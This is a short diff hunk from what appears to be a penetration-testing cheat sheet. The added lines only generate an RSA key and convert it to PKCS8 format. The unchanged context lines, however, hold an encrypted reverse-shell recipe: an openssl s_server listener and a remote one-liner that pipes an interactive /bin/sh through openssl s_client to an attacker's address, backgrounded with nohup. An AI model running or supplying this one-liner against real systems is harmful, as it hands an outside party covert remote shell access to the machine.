@@ -71,6 +71,11 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
 //remote:
 mkfifo /tmp/s; nohup /bin/sh -i < /tmp/s 2>&1 | nohup openssl s_client -quiet -verify 0 -connect <LOCALIP>:<PORT> > /tmp/s &
 
+//gen pkcs8 key
+openssl genrsa -out key.pem 4096
+openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in key.pem -out pkcs8.key
+
+
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 find
